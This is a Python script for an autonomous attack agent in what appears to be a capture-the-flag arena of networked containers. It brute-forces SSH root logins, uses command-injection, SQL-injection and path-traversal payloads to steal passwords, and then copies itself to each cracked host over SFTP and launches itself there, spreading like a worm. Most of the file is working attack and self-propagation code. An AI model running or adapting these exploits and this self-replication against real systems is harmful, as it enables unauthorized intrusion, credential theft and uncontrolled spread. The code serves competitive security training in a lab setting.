import os
import time
import socket
import json
import requests
import subprocess
import random
import numpy as np
from concurrent.futures import ThreadPoolExecutor

# Forced Fallback: PyTorch is too heavy for 256MB nodes
HAS_TORCH = False
# try:
#     import torch
#     import torch.nn as nn
#     import torch.optim as optim
#     HAS_TORCH = True
# except ImportError:
#     HAS_TORCH = False

# --- CONFIG ---
import sys
ORCHESTRATOR = "http://arena_orchestrator:5000"
# Use fixed IP if DNS fails: "http://172.20.0.12:5000"

TEAM = sys.argv[1].upper() if len(sys.argv) > 1 else os.environ.get("TEAM", "RED")
GRID_SIZE = int(os.environ.get("GRID_SIZE", 6))
MEMORY_FILE = "neural_memory.pth" 
IDENTITY_FILE = "identity.json"

# CTF State
has_key = False
key_location = None

# Advanced Attack Brain (from Smart Gladiator)
hacking_brain = {
    "vulnerability_map": {}, # IP -> List of discovered vulnerabilities
    "pattern_knowledge": {}  # Grid pattern -> List of vulnerabilities
}

def load_brain_memory():
    """Load hacking brain findings from identity file or separate memory"""
    global hacking_brain
    path = "hacking_memory.json"
    if os.path.exists(path):
        try:
            with open(path, 'r') as f:
                data = json.load(f)
                hacking_brain["vulnerability_map"] = data.get("vulnerability_map", {})
                hacking_brain["pattern_knowledge"] = data.get("pattern_knowledge", {})
                log(f"🧠 Hacking Memory Loaded. Vulns known: {len(hacking_brain['vulnerability_map'])}")
        except: pass

def save_brain_memory():
    path = "hacking_memory.json"
    try:
        with open(path, 'w') as f:
            json.dump(hacking_brain, f)
    except: pass

def get_identity():
    # Helper to persist ID across migrations (files are copied, hostname changes)
    if os.path.exists(IDENTITY_FILE):
        try:
            with open(IDENTITY_FILE, 'r') as f:
                data = json.load(f)
                return data.get("id")
        except: pass
    
    # Generate New
    new_id = f"Neural_{TEAM}_{socket.gethostname()[:5]}"
    try:
        with open(IDENTITY_FILE, 'w') as f:
            json.dump({"id": new_id}, f)
    except: pass
    return new_id

MY_ID = get_identity()

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}")
    try:
        requests.post(f"{ORCHESTRATOR}/api/log", json={"gladiator_id": MY_ID, "message": msg, "type": "log"}, timeout=2)
    except Exception as e:
        print(f"LOG ERROR: {e}")

def log_status(msg):
    print(f"\r[{time.strftime('%H:%M:%S')}] {msg}", end="")
    try:
        requests.post(f"{ORCHESTRATOR}/api/log", json={"gladiator_id": MY_ID, "message": msg, "type": "status"}, timeout=2)
    except Exception as e:
        print(f"STATUS LOG ERROR: {e}")

# --- NEURAL ARCHITECTURE ---
if HAS_TORCH:
    class NeuralPredictor(nn.Module):
        def __init__(self, input_dim=4, hidden_dim=32):
            super(NeuralPredictor, self).__init__()
            # Inputs: X, Y, Team_ID (0/1), Neighborhood_Entropy
            self.network = nn.Sequential(
                nn.Linear(input_dim, hidden_dim),
                nn.ReLU(),
                nn.Linear(hidden_dim, hidden_dim),
                nn.ReLU(),
                nn.Linear(hidden_dim, 7) # 4 Themes + 3 Mutations
            )
            self.softmax = nn.Softmax(dim=1)

        def forward(self, x):
            return self.network(x)
else:
    class NeuralPredictor:
        def __init__(self, input_dim=4, hidden_dim=32):
            self.input_dim = input_dim
            self.hidden_dim = hidden_dim
            # Weights: (3 layers total as per NeuralPredictor)
            self.weights = {
                'w1': np.zeros((input_dim, hidden_dim)),
                'b1': np.zeros(hidden_dim),
                'w2': np.zeros((hidden_dim, hidden_dim)),
                'b2': np.zeros(hidden_dim),
                'w3': np.zeros((hidden_dim, 7)),
                'b3': np.zeros(7)
            }

        def relu(self, x):
            return np.maximum(0, x)

        def forward(self, x):
            # x shape should be (1, input_dim)
            h1 = self.relu(np.dot(x, self.weights['w1']) + self.weights['b1'])
            h2 = self.relu(np.dot(h1, self.weights['w2']) + self.weights['b2'])
            out = np.dot(h2, self.weights['w3']) + self.weights['b3']
            return out

        def load_from_json(self, path):
            if not os.path.exists(path): return False
            try:
                with open(path, 'r') as f:
                    data = json.load(f)
                    for k in self.weights:
                        if k in data:
                            self.weights[k] = np.array(data[k])
                return True
            except: return False

        def load_state_dict(self, state_dict):
            # Compatibility with torch state_dict
            mapping = {
                'network.0.weight': ('w1', True),
                'network.0.bias': ('b1', False),
                'network.2.weight': ('w2', True),
                'network.2.bias': ('b2', False),
                'network.4.weight': ('w3', True),
                'network.4.bias': ('b3', False)
            }
            for torch_k, (np_k, transpose) in mapping.items():
                if torch_k in state_dict:
                    val = state_dict[torch_k]
                    if hasattr(val, 'cpu'): val = val.cpu().numpy()
                    self.weights[np_k] = val.T if transpose else val
            return True

        def eval(self): pass
        def train(self): pass
        def to(self, device): return self

# --- GLOBAL STATE ---
if HAS_TORCH:
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
else:
    device = "cpu"
model = None
optimizer = None
criterion = nn.CrossEntropyLoss() if HAS_TORCH else None

THEMES = {
    0: "admin_root", # [admin, root, password]
    1: "rpg",        # [dragon, shadow, master]
    2: "arena",      # [spartacus, gladiator, battle]
    3: "mixed"       # [qwerty, 123456, security]
}
MUTATIONS = {
    0: "raw",
    1: "digit_1",
    2: "digit_2"
}

MEMORY_JSON_FILE = "neural_memory.json"

def init_neural_engine():
    global model, optimizer
    if HAS_TORCH:
        model = NeuralPredictor().to(device)
        optimizer = optim.Adam(model.parameters(), lr=0.01)
        
        if os.path.exists(MEMORY_FILE):
            try:
                model.load_state_dict(torch.load(MEMORY_FILE, map_location=device))
                log(f"🧠 NEURAL ENGINE: LOADED (Torch). Device: {device}")
            except:
                log("🧠 NEURAL ENGINE: INIT NEW (Torch).")
        else:
            log(f"🧠 NEURAL ENGINE: ONLINE (Torch). Device: {device}")
    else:
        # NumPy Fallback
        model = NeuralPredictor().to(device)
        if os.path.exists(MEMORY_JSON_FILE):
            if model.load_from_json(MEMORY_JSON_FILE):
                log("🧠 NEURAL ENGINE: LOADED (NumPy)")
            else:
                log("🧠 NEURAL ENGINE: LOAD FAIL (NumPy)")
        else:
            log("🧠 NEURAL ENGINE: ONLINE (NumPy - Initial Weights)")

def save_neural_memory():
    if not model: return
    
    if HAS_TORCH:
        # Save Torch Version
        torch.save(model.state_dict(), MEMORY_FILE)
        
        # ALSO save JSON version for NumPy nodes to use!
        try:
            state = model.state_dict()
            json_state = {}
            for k, v in state.items():
                json_state[k] = v.cpu().numpy().tolist()
            
            # Map keys to NumPyPredictor format
            mapping = {
                'network.0.weight': 'w1', 'network.0.bias': 'b1',
                'network.2.weight': 'w2', 'network.2.bias': 'b2',
                'network.4.weight': 'w3', 'network.4.bias': 'b3'
            }
            mapped_data = {}
            for torch_k, np_k in mapping.items():
                if torch_k in json_state:
                    val = np.array(json_state[torch_k])
                    # Torch Linear stores weights as (out_features, in_features), NumPy uses (in, out)
                    if 'weight' in torch_k:
                        mapped_data[np_k] = val.T.tolist()
                    else:
                        mapped_data[np_k] = val.tolist()
            
            with open(MEMORY_JSON_FILE, 'w') as f:
                json.dump(mapped_data, f)
        except Exception as e:
            log(f"⚠️ Failed to export JSON weights: {e}")
    else:
        # Save NumPy Version
        try:
            serializable_weights = {k: v.tolist() for k, v in model.weights.items()}
            with open(MEMORY_JSON_FILE, 'w') as f:
                json.dump(serializable_weights, f)
        except Exception as e:
            log(f"⚠️ Failed to save NumPy weights: {e}")

def get_input_tensor(x, y):
    # Normalize inputs for the network
    team_val = 1.0 if TEAM == "RED" else 0.0
    entropy = (x * y) / (GRID_SIZE * GRID_SIZE) # Dummy entropy signal
    return torch.FloatTensor([[x/GRID_SIZE, y/GRID_SIZE, team_val, entropy]]).to(device)

def get_neural_priorities(x, y):
    if not HAS_TORCH or not model:
        return [0, 1, 2, 3], [0, 1, 2] # Default

    model.eval()
    with torch.no_grad():
        inputs = get_input_tensor(x, y)
        outputs = model(inputs)
        
        # Split output into Theme (0-3) and Mutation (4-6)
        theme_logits = outputs[0, :4]
        mut_logits = outputs[0, 4:]
        
        theme_order = torch.argsort(theme_logits, descending=True).tolist()
        mut_order = torch.argsort(mut_logits, descending=True).tolist()
        
    return theme_order, mut_order

def train_on_success(x, y, theme_idx, mut_idx):
    if not HAS_TORCH or not model: return
    
    log(f"🔥 Online Training: Strengthening path ({theme_idx}, {mut_idx}) for ({x},{y})")
    model.train()
    optimizer.zero_grad()
    
    inputs = get_input_tensor(x, y)
    outputs = model(inputs)
    
    # Target: We want theme_idx and mut_idx to be the global maximums
    # Simplified: Multi-label cross entropy or just two separate targets
    # We'll do a simple hard target for the successful combination
    target_theme = torch.tensor([theme_idx]).to(device)
    target_mut = torch.tensor([mut_idx]).to(device)
    
    loss_theme = criterion(outputs[:, :4], target_theme)
    loss_mut = criterion(outputs[:, 4:], target_mut)
    
    (loss_theme + loss_mut).backward()
    optimizer.step()
    save_neural_memory()

# --- HACKING LOGIC ---
WORDS = {
    0: ["admin", "root", "password"],
    1: ["dragon", "shadow", "master"],
    2: ["spartacus", "gladiator", "battle", "arena"],
    3: ["qwerty", "123456", "security"]
}

import paramiko

def attempt_login(password, ip):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username='root', password=password, timeout=2, banner_timeout=5)
        ssh.close()
        return True
    except (paramiko.AuthenticationException, paramiko.SSHException, socket.timeout, Exception):
        return False

def scout_clue(ip):
    try:
        # Try to get intel from port 8000
        res = requests.get(f"http://{ip}:8000/clue.txt", timeout=1)
        if res.status_code == 200:
            clue = res.text.strip()
            log(f"🕵️ INTEL FOUND: {clue}")
            return clue
    except Exception as e:
        print(f"SCOUT ERROR: {e}")
    return None

def exploit_rce(ip):
    try:
        # The Exploit: Inject command into 'check' parameter
        log_status(f"⚡ RCE: Injecting payload at {ip}...")
        payload = "127.0.0.1; cat /gladiator/password_hint.txt"
        res = requests.get(f"http://{ip}:8000/health?check={payload}", timeout=2)
        
        if res.status_code == 200:
            content = res.text
            # Parse the output
            if "Root Password set to:" in content:
                password = content.split("Root Password set to:")[1].strip()
                log(f"💥 EXPLOIT SUCCESS (RCE): Stole Password '{password}'")
                return password
    except: pass
    return None

def exploit_sqli(ip):
    """Try SQL Injection to bypass authentication and steal credentials"""
    try:
        log_status(f"💉 SQLi: Injecting payload at {ip}...")
        payload = {
            'username': "admin' OR '1'='1'--",
            'password': 'anything'
        }
        res = requests.post(f"http://{ip}:8000/api/login", data=payload, timeout=2)
        if res.status_code == 200:
            data = res.json()
            if data.get('success') and 'password' in data:
                password = data['password']
                log(f"💥 EXPLOIT SUCCESS (SQLi): Stole Password '{password}'")
                return password
    except:
        pass
    return None

def exploit_lfi(ip):
    """Try Directory Traversal (Local File Inclusion) to read password file"""
    try:
        log_status(f"📂 LFI: Path traversal at {ip}...")
        # Try to read password hint via directory traversal
        res = requests.get(f"http://{ip}:8000/api/file?path=/gladiator/password_hint.txt", timeout=2)
        if res.status_code == 200:
            content = res.text
            if "Root Password set to:" in content:
                password = content.split("Root Password set to:")[1].strip()
                log(f"💥 EXPLOIT SUCCESS (LFI): Stole Password '{password}'")
                return password
    except:
        pass
    return None

def get_key_location():
    """Query orchestrator for key location"""
    try:
        res = requests.get(f"{ORCHESTRATOR}/api/grid", timeout=2)
        data = res.json()
        key_loc = data.get('key_location', '2,3')
        return tuple(map(int, key_loc.split(',')))
    except:
        return (2, 3)  # Default

import threading

def calculate_min_corner_distance(x, y):
    """Calculate Manhattan distance to nearest corner"""
    dist_00 = x + y
    dist_05 = x + (5 - y)
    dist_50 = (5 - x) + y
    dist_55 = (5 - x) + (5 - y)
    return min(dist_00, dist_05, dist_50, dist_55)

def learn_vulnerability_pattern(x, y, discovered_vulns):
    """Learn which vulnerabilities appear at which grid locations"""
    global hacking_brain
    min_dist = calculate_min_corner_distance(x, y)
    
    if min_dist == 0: pattern_key = "corners"
    elif min_dist <= 2: pattern_key = "edges"
    else: pattern_key = "center"
    
    hacking_brain["pattern_knowledge"][pattern_key] = discovered_vulns
    log(f"📊 Pattern Learned: {pattern_key} nodes have {len(discovered_vulns)} vulnerabilities")
    save_brain_memory()

def predict_vulnerabilities(x, y):
    """Predict which vulnerabilities likely exist based on location"""
    min_dist = calculate_min_corner_distance(x, y)
    
    if min_dist == 0 and "corners" in hacking_brain["pattern_knowledge"]:
        return hacking_brain["pattern_knowledge"]["corners"]
    elif min_dist <= 2 and "edges" in hacking_brain["pattern_knowledge"]:
        return hacking_brain["pattern_knowledge"]["edges"]
    elif "center" in hacking_brain["pattern_knowledge"]:
        return hacking_brain["pattern_knowledge"]["center"]
    
    return None

def get_key_location():
    """Contact orchestrator to find key location"""
    try:
        res = requests.get(f"{ORCHESTRATOR}/api/grid", timeout=2)
        data = res.json()
        key_str = data.get("key_location", "Unknown")
        if "," in key_str:
            parts = key_str.split(',')
            return (int(parts[1]), int(parts[0])) # Grid is usually X,Y but API uses Y,X
    except:
        pass
    return (2, 3) # Fallback to center

def check_for_key():
    """Check if we're standing on the key"""
    global has_key
    if os.path.exists("/gladiator/THE_KEY.txt"):
        if not has_key:
            log("💎 FOUND THE KEY!! Returning to base...")
            has_key = True
            return True
    return False

def get_next_move_towards(target_x, target_y, my_x, my_y):
    """Calculate best next move towards target using Manhattan distance"""
    best_move = None
    best_dist = abs(target_x - my_x) + abs(target_y - my_y)
    
    # If we're already at target, return None
    if best_dist == 0:
        return None
    
    for dy in [-1, 0, 1]:
        for dx in [-1, 0, 1]:
            if dx == 0 and dy == 0: continue
            nx, ny = my_x + dx, my_y + dy
            if 0 <= nx < GRID_SIZE and 0 <= ny < GRID_SIZE:
                dist = abs(target_x - nx) + abs(target_y - ny)
                if dist < best_dist:
                    best_dist = dist
                    best_move = (nx, ny)
    
    return best_move

def background_password_guesser(ip, x, y, result_dict):
    """Background thread that tries passwords while web exploits run"""
    theme_order, mut_order = get_neural_priorities(x, y)
    
    for t_idx in theme_order:
        if result_dict["found"]:
            return  # Another exploit succeeded
        
        base_words = WORDS[t_idx]
        for m_idx in mut_order:
            if result_dict["found"]:
                return
            
            # Generate guesses
            guesses = []
            if m_idx == 0:  # Raw
                guesses = base_words
            elif m_idx == 1:  # 1-Digit
                for i in range(10):
                    for w in base_words:
                        guesses.append(f"{w}{i}")
            elif m_idx == 2:  # 2-Digit
                for i in range(100):
                    for w in base_words:
                        guesses.append(f"{w}{i}")
            
            for pwd in guesses:
                if result_dict["found"]:
                    return
                if attempt_login(pwd, ip):
                    result_dict["found"] = True
                    result_dict["password"] = pwd
                    return
                time.sleep(0.05)  # Rate limit

def crack_node(ip, x, y):
    """Adaptive attack using discovery and predictions"""
    global hacking_brain
    
    # 1. Determine which vulnerabilities to try
    known_vulns = None
    
    # Check memory
    if ip in hacking_brain["vulnerability_map"]:
        known_vulns = hacking_brain["vulnerability_map"][ip]
        log(f"📋 Known vulnerabilities for {ip}: {', '.join(known_vulns)}")
    else:
        # Predict based on location
        predicted_vulns = predict_vulnerabilities(x, y)
        if predicted_vulns is not None:
            log(f"🔮 Predicted vulnerabilities: {', '.join(predicted_vulns)}")
            known_vulns = predicted_vulns
        else:
            # Reconnaissance Probing
            try:
                from exploits import reconnaissance
                log(f"🔍 Probing {ip} for vulnerabilities...")
                known_vulns = reconnaissance(ip)
                log(f"✅ Discovered: {', '.join(known_vulns) if known_vulns else 'None'}")
                if known_vulns:
                    learn_vulnerability_pattern(x, y, known_vulns)
            except ImportError:
                known_vulns = []
        
        # Save to memory
        hacking_brain["vulnerability_map"][ip] = known_vulns
        save_brain_memory()
    
    # 2. Import exploit maps
    try:
        from exploits import EXPLOIT_MAP
    except ImportError:
        EXPLOIT_MAP = {}
    
    # 3. Start background password guesser (Concurrent)
    password_result = {"found": False, "password": None}
    guesser_thread = threading.Thread(target=background_password_guesser, args=(ip, x, y, password_result))
    guesser_thread.daemon = True
    guesser_thread.start()
    
    # 4. Try ONLY discovered/predicted vulnerabilities
    if known_vulns and EXPLOIT_MAP:
        for vuln_name in known_vulns:
            if password_result["found"]: break
            exploit_func = EXPLOIT_MAP.get(vuln_name)
            if exploit_func:
                try:
                    log(f"⚡ Testing exploit: {vuln_name} on {ip}...")
                    password = exploit_func(ip)
                    if password and attempt_login(password, ip):
                        log(f"🔓 PWNED via {vuln_name}: {password}")
                        password_result["found"] = True
                        # Neural feedback
                        for t_idx, words in WORDS.items():
                            for w in words:
                                if password.startswith(w):
                                    train_on_success(x, y, t_idx, 0)
                                    break
                        return password
                except: pass
    
    # 5. Wait for background guesser if exploits failed
    if not password_result["found"]:
        log("⏳ Web exploits failed. Waiting for password guesser...")
        guesser_thread.join(timeout=30)
    
    if password_result["found"]:
        log(f"🔓 PWNED via Brute Force: {password_result['password']}")
        # Neural learning already handled in guesser if needed or here
        return password_result["password"]
    
    return None

def neural_hack(ip, x, y):
    """Neural network guided password cracking - returns password if successful"""
    # Scout for Clues (The "Traditional" Way)
    scout_clue(ip) 
    
    theme_order, mut_order = get_neural_priorities(x, y)
    
    log(f"🧠 Neural Analysis complete. Prioritizing Theme {theme_order[0]} and Mutation {mut_order[0]}.")
    
    for t_idx in theme_order:
        base_words = WORDS[t_idx]
        for m_idx in mut_order:
            # Generate guesses for this combination
            guesses = []
            if m_idx == 0: # Raw
                guesses = base_words
            elif m_idx == 1: # 1-Digit
                for i in range(10): 
                    for w in base_words: guesses.append(f"{w}{i}")
            elif m_idx == 2: # 2-Digit
                for i in range(100):
                    for w in base_words: guesses.append(f"{w}{i}")
            
            # Prune to avoid firewall lockout (10 tries per node roughly)
            for i, pwd in enumerate(guesses):
                if i > 25: break 
                log_status(f"🔑 Trying: {pwd}")
                if attempt_login(pwd, ip):
                    log(f"🔓 NEURAL SUCCESS: {pwd}")
                    train_on_success(x, y, t_idx, m_idx)
                    return pwd  # Return password for migration
    return None

def migrate_self(target_ip, password, team):
    """
    Autonomously migrate to target node via SSH/SCP.
    This is TRUE migration - we copy ourselves and start a new instance.
    """
    try:
        log(f"🚀 Initiating self-migration to {target_ip}...")
        
        # 1. Connect to target via SSH
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, username='root', password=password, timeout=5)
        
        # 2. Copy our script and memory files via SCP
        sftp = ssh.open_sftp()
        
        # Copy the main script
        sftp.put('/gladiator/neural_gladiator.py', '/gladiator/neural_gladiator.py')
        log(f"📦 Copied neural_gladiator.py to {target_ip}")
        
        # Copy memory files if they exist
        for filename in ['memory.json', 'identity.json']:
            local_path = f'/gladiator/{filename}'
            if os.path.exists(local_path):
                sftp.put(local_path, local_path)
                log(f"📦 Copied {filename} to {target_ip}")
        
        sftp.close()
        
        # 3. Start ourselves on the target node
        cmd = f'cd /gladiator && nohup python3 neural_gladiator.py {team} > /dev/null 2>&1 &'
        ssh.exec_command(cmd)
        ssh.close()
        
        log(f"✅ Migration complete! New instance started at {target_ip}")
        return True
        
    except Exception as e:
        log(f"❌ Migration failed: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    global has_key
    init_neural_engine()
    load_brain_memory()
    log(f"Gladiator {MY_ID} deployed on Node.")
    requests.post(f"{ORCHESTRATOR}/api/register", json={"gladiator_id": MY_ID})
    
    # Get IP to find neighbors
    hostname = socket.gethostname()
    my_ip = socket.gethostbyname(hostname)
    # Parse coords from IP
    parts = my_ip.split('.')
    my_y, my_x = int(parts[2]), int(parts[3]) - 10

    # CLAIM SELF to appear on map
    log(f"📍 Announcing presence at {my_ip}...")
    requests.post(f"{ORCHESTRATOR}/api/claim", json={"gladiator_id": MY_ID, "target_ip": my_ip})
    
    while True:
        # 1. Update Objectives
        check_for_key()
        key_loc = get_key_location()
        
        # 2. Determine Target
        if has_key:
            target_y, target_x = (0, 0) if TEAM == "RED" else (5, 5)
            log_status(f"🏃 KEY SECURED! Returning to base ({target_y},{target_x})...")
            
            # Check if we are AT base
            if (my_y, my_x) == (target_y, target_x):
                log("🏁 REACHED HOME BASE! Submitting key...")
                try:
                    res = requests.post(f"{ORCHESTRATOR}/api/submit_key", 
                                     json={"gladiator_id": MY_ID}, timeout=5)
                    log(f"🏆 {res.json().get('status', 'Submitted')}")
                    # After submitting, we might lose the key (if it resets)
                    if os.path.exists("/gladiator/THE_KEY.txt"):
                        os.remove("/gladiator/THE_KEY.txt")
                    has_key = False
                except Exception as e:
                    log(f"❌ Submission Error: {e}")
        else:
            target_y, target_x = key_loc
            log_status(f"🎯 Objective: Key at ({target_y},{target_x})")

        # 3. Find Best Neighbor
        best_dist = abs(target_x - my_x) + abs(target_y - my_y)
        
        # We look for a neighbor that brings us closer
        neighbors = []
        for dy in [-1, 0, 1]:
            for dx in [-1, 0, 1]:
                if dx == 0 and dy == 0: continue
                nx, ny = my_x + dx, my_y + dy
                if 0 <= nx < GRID_SIZE and 0 <= ny < GRID_SIZE:
                    dist = abs(target_x - nx) + abs(target_y - ny)
                    neighbors.append((nx, ny, dist))
        
        # Sort by distance to target (closest first)
        neighbors.sort(key=lambda x: x[2])
        
        # 4. Try to migrate
        moved = False
        for nx, ny, dist in neighbors:
            if moved: break
            
            target_ip = f"172.20.{ny}.{10+nx}"
            # Only log migration attempts, not every "consideration" to keep it clean
            # log(f"🔎 Considering {target_ip} (Dist: {dist})...") 
            
            password = crack_node(target_ip, nx, ny)
            if password:
                log(f"🚩 Cracked {target_ip}! Migrating...")
                if migrate_self(target_ip, password, TEAM):
                    try:
                        requests.post(f"{ORCHESTRATOR}/api/claim", 
                                    json={"gladiator_id": MY_ID, "target_ip": target_ip},
                                    timeout=2)
                    except: pass
                    log(f"👋 Exit. Migrated to {target_ip}")
                    return # New instance takes over
                else:
                    log(f"⚠️ Migration failed: {target_ip}")

        if not moved:
            log_status(f"⏳ Waiting for opening at ({my_y},{my_x})...")
            time.sleep(10)

if __name__ == "__main__":
    main()
